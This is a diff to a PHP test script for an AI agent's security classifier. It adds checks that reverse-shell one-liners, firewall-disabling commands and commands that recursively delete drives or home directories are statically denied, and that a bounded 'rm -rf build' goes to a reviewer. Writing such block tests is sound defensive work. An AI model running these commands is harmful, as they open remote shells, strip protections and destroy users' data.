@@ -1,10 +1,12 @@
 <?php
 declare(strict_types=1);
 
-require dirname(__DIR__) . '/src/Agent.php';
-require dirname(__DIR__) . '/src/SessionStore.php';
-require dirname(__DIR__) . '/src/SecurityClassifier.php';
-require dirname(__DIR__) . '/src/AskUser.php';
+$autoload = dirname(__DIR__) . '/vendor/autoload.php';
+if (!is_file($autoload)) {
+    fwrite(STDERR, "Dependencies are not installed. Run: composer install\n");
+    exit(1);
+}
+require_once $autoload;
 
 use MyAgent\Agent;
 use MyAgent\Ansi;
@@ -317,7 +319,40 @@ $never = new class('unused') extends AnthropicClient {
 $gate = new SecurityClassifier($never, 'reviewer', $root, ['audit_log' => '']);
 $static = $gate->review(['type' => 'tool_use', 'id' => 'static', 'name' => 'run_command', 'input' => ['command' => 'rm -rf /']], [], $catalog);
 check($static['verdict'] === 'deny' && $static['source'] === 'static', 'Catastrophic command was not blocked');
+
+// HARD BLOCK patterns extracted from Claude Code's security classifier.
+$catastrophic = [
+    'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1',
+    'nc -e /bin/sh 10.0.0.1 4444',
+    'netsh advfirewall set allprofiles state off',
+    'Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False',
+    'Remove-Item -Recurse -Force C:\\',
+    'Remove-Item C:\\ -Recurse -Force',
+    'Remove-Item -Recurse -Force $HOME',
+    'cipher /w:C:',
+    'rm -rf $HOME/*',
+    'rm -rf /home',
+];
+foreach ($catastrophic as $command) {
+    $decision = $gate->review(
+        ['type' => 'tool_use', 'id' => 'static', 'name' => 'run_command', 'input' => ['command' => $command]],
+        [],
+        $catalog
+    );
+    check($decision['verdict'] === 'deny' && $decision['source'] === 'static', 'Catastrophic command was not blocked: ' . $command);
+}
 check($never->calls === 0, 'Static check did not short-circuit the reviewer');
+
+// A bounded delete is a SOFT BLOCK, not a deterministic HARD BLOCK.
+$bounded = $gate->review(
+    ['type' => 'tool_use', 'id' => 'bounded', 'name' => 'run_command', 'input' => ['command' => 'rm -rf build']],
+    [],
+    $catalog
+);
+check($bounded['verdict'] === 'allow' && $bounded['source'] === 'reviewer', 'Bounded rm -rf was statically blocked');
+check($never->calls === 1, 'Bounded rm -rf did not reach the reviewer');
+$never->calls = 0;
+
 $read = $gate->review(['type' => 'tool_use', 'id' => 'read', 'name' => 'read_file', 'input' => ['path' => 'README.md']], [], $catalog);
 check($read['verdict'] === 'allow' && $read['source'] === 'auto-allow', 'Read-only tool was not auto-allowed');
 check($never->calls === 0, 'Auto-allowed tool reached the reviewer');
